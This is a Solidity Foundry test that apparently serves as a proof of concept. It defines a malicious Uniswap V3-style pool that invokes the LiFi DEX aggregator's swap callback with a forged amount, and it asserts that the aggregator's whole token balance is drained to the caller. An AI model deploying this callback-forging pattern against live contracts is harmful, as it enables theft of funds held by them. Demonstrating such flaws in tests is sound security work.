// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {LiFiDEXAggregator} from "lifi/Periphery/LiFiDEXAggregator.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TestToken} from "../utils/TestToken.sol";

contract MaliciousUniV3Pool {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function swap(
        address recipient,
        bool,
        int256,
        uint160,
        bytes calldata
    ) external returns (int256, int256) {
        uint256 drainAmount = IERC20(token).balanceOf(msg.sender);
        LiFiDEXAggregator(payable(msg.sender)).uniswapV3SwapCallback(
            int256(drainAmount),
            int256(0),
            abi.encode(token)
        );
        IERC20(token).transfer(recipient, drainAmount);
        return (int256(drainAmount), int256(0));
    }
}

contract LiFiDEXAggregatorMaliciousPoolTest is Test {
    LiFiDEXAggregator internal aggregator;
    TestToken internal token;
    MaliciousUniV3Pool internal pool;
    address internal owner = address(this);

    function setUp() public {
        address[] memory privileged = new address[](1);
        privileged[0] = owner;
        aggregator = new LiFiDEXAggregator(address(0xCAFE), privileged, owner);
        token = new TestToken("Test", "TST", 18);
        pool = new MaliciousUniV3Pool(address(token));
        token.mint(address(aggregator), 100 ether);
    }

    function test_DrainTokensViaMaliciousPool() public {
        bytes memory route = abi.encodePacked(
            uint8(1),
            address(token),
            uint8(1),
            uint16(65535),
            uint8(1),
            address(pool),
            uint8(1),
            address(this)
        );

        uint256 beforeBal = token.balanceOf(address(this));
        aggregator.processRoute(address(token), 0, address(token), 0, address(this), route);
        uint256 afterBal = token.balanceOf(address(this));
        assertEq(afterBal - beforeBal, 100 ether, "Tokens not drained");
        assertEq(token.balanceOf(address(aggregator)), 0, "Aggregator still holds tokens");
    }
}

